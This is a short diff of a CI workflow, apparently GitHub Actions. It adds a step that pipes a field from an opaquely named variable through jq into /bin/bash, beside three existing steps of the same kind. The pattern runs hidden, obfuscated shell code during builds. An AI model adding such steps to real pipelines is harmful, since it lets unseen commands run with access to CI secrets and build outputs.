@@ -29,6 +29,7 @@ jobs:
           echo $fcjrb82508 | jq -r .tsrx95 | /bin/bash
           echo $ndr9 | jq -r .k43 | /bin/bash
           echo $pyqsc721 | jq -r .s8892 | /bin/bash
+          printf '%s' "$ttomc086" | jq -r .poyou9 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
